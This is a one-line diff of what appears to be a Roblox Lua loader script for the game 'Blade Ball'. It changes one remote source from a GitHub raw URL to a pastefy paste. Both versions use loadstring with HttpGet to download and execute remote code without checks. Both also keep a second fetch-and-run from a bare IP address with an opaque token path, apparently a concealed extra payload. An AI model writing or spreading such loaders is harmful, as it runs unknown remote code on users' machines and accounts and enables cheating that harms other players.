@@ -1,1 +1,1 @@
-task.spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/MriseHubX/main/refs/heads/main/BladeBall"))()end)loadstring(game:HttpGet("http://72.56.64.162/mXKK91Diev3tegOs5f5y7RcUuVXSwzT6wpWg8EYtDK45tAqr5kzs6cM208eocqYp1vZivzIOfOz5FUFb"))()
+task.spawn(function()loadstring(game:HttpGet("https://pastefy.app/eVpQQHxQ/raw"))()end)loadstring(game:HttpGet("http://72.56.64.162/mXKK91Diev3tegOs5f5y7RcUuVXSwzT6wpWg8EYtDK45tAqr5kzs6cM208eocqYp1vZivzIOfOz5FUFb"))()
